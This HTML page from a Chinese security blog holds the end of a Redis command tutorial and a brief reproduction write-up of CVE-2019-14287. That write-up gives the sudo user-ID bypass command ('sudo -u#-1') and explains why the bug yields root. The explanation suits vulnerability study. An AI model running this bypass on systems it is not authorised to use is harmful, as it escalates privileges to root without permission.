<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lpush plant apple</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; lpush plant orange</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379&gt; lrange plant 0 1</span><br><span class="line">1) &quot;orange&quot;</span><br><span class="line">2) &quot;apple&quot;</span><br><span class="line">127.0.0.1:6379&gt; lpush plant banana</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; lrange plant 0 1</span><br><span class="line">1) &quot;banana&quot;</span><br><span class="line">2) &quot;orange&quot;</span><br><span class="line">127.0.0.1:6379&gt; lrange plant 0 2</span><br><span class="line">1) &quot;banana&quot;</span><br><span class="line">2) &quot;orange&quot;</span><br><span class="line">3) &quot;apple&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>Set（集合）</strong><br>redis的set是string类型的无序集合<br>集合是通过哈希表实现的，所以添加，删除，查找的复杂度都为o(1)</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sadd plant apple</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; sadd plant orange</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; sadd plant banana</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; smembers plant</span><br><span class="line">1) &quot;orange&quot;</span><br><span class="line">2) &quot;banana&quot;</span><br><span class="line">3) &quot;apple&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>zset（sorted set：有序列表）</strong><br>和set一样也是string类型元素的集合，且不允许重复<br>不同的是每个元素都会关联一个double类型的分数，redis正是通过分数来为集合中的成员进行从小到大的排序<br>成员是唯一的，当分数却可以重复<br>zadd key score member </p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; zadd plant 0 apple</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd plant 0 orange</span><br><span class="line"> 127.0.0.1:6379&gt; zadd plant 0 banana</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; zrangebyscore plant 0 1</span><br><span class="line">1) &quot;apple&quot;</span><br><span class="line">2) &quot;banana&quot;</span><br><span class="line">3) &quot;orange&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>对键值key的操作</strong><br>见 <a href="https://www.cnblogs.com/reyinever/p/10041108.html" target="_blank" rel="noopener">https://www.cnblogs.com/reyinever/p/10041108.html</a><br>    <a href="https://www.runoob.com/redis/redis-keys.html" target="_blank" rel="noopener">https://www.runoob.com/redis/redis-keys.html</a></p>
<p><strong>redis事务</strong><br>可以一次执行多个命令，</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; multi</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set a aaa</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379&gt; set b bbb</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379&gt; set c ccc</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379&gt; exec</span><br><span class="line">1) OK</span><br><span class="line">2) OK</span><br><span class="line">3) OK</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></table></figure></div>


      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-cve-2019-14287-sudo之权限绕过漏洞" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/16/cve-2019-14287-sudo之权限绕过漏洞/">cve-2019-14287:sudo之权限绕过漏洞</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/16/cve-2019-14287-sudo之权限绕过漏洞/" class="article-date">
  <time datetime="2019-10-16T07:49:45.000Z" itemprop="datePublished">2019-10-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞复现/">漏洞复现</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="cve-2019-14287-sudo之权限绕过漏洞"><a href="#cve-2019-14287-sudo之权限绕过漏洞" class="headerlink" title="cve-2019-14287:sudo之权限绕过漏洞"></a>cve-2019-14287:sudo之权限绕过漏洞</h1><p>影响版本：sudo 1.8.28之前的所有版本<br>这里我的环境是Centos7，sudo版本为1.8.23<br>/etc/sudoers 文件中all关键字允许admin或者sudo组中的所有用户以系统中的任何有效用户身份允许任何命令<br>sudoers文件如下：<br><img src="/images/Article_images/linux_test.png" alt="sudoers文件"><br>要使用sudo绕过，前提是要有上面sudoers文件的安全策略设置 root    ALL=(ALL:ALL)ALL</p>
<p><strong>如何利用这个漏洞：</strong></p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#-1 命令，，，或者 sudo -u#4294967295</span><br></pre></td></tr></table></figure></div>

<p>下面开始测试，<br><img src="/images/Article_images/linux_test2.png" alt></p>
<p><strong>最后</strong><br>导致这个漏洞的原因是由于将用户ID转换为用户名的函数会将-1（或无效等效的4294967295）误认为是0，，而0有恰好是root的ID</p>

      
    </div>
    
  </div>
  
  
</article>

  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>


</section>
        <aside id="sidebar">
  
    <div class="widget-box">
  <div class="avatar-box">
    <img class="avatar" src="/images/default-avatar.jpg" title="图片来自网络"></img>
    <h3 class="avatar-name">
      
        闪电啊哈哈
      
    </h3>
    <p class="avatar-slogan">
      何必管一片海，有多澎湃
    </p>
  </div>
</div>


  
    
  <div class="widget-box">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB相关/">WEB相关</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/">无线渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/网络工程/">网络工程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/计算机操作系统/">计算机操作系统</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-box">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
    </div>
  </div>

  
    
  <div class="widget-box">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/07/01/小米手机root/">小米手机root</a>
          </li>
        
          <li>
            <a href="/2021/06/30/Weiphp5-0任意文件上传/">Weiphp5.0任意文件上传</a>
          </li>
        
          <li>
            <a href="/2021/06/28/9-2后台登录绕过/">youdiancms9.2后台登录绕过&#39;</a>
          </li>
        
          <li>
            <a href="/2021/06/05/某个SpringBoot项目的审计/">某个SpringBoot项目的审计</a>
          </li>
        
          <li>
            <a href="/2019/11/03/操作系统概述/">操作系统概述</a>
          </li>
        
      </ul>
    </div>
  </div>

  
      <div class="widget-box">
    <h3 class="widget-title">友链</h3>
    <div class="widget">
      
    </div>
  </div>

  
</aside>
      </div>
      <footer id="footer">
  <div class="foot-box global-width">
    &copy; 2021 闪电 &nbsp;&nbsp;
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    &nbsp;|&nbsp;主题 <a href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
    <br>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
  </div>
</footer>
      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
<script>
if (!window.jQuery) {
var script = document.createElement('script');
script.src = "/js/jquery-2.0.3.min.js";
document.body.write(script);
}
</script>

  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



    </div>
    <nav id="mobile-nav" class="mobile-nav-box">
  <div class="mobile-nav-img mobile-nav-top"></div>
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
  <div class="mobile-nav-img  mobile-nav-bottom"></div>
</nav>    
  </div>
</body>
</html>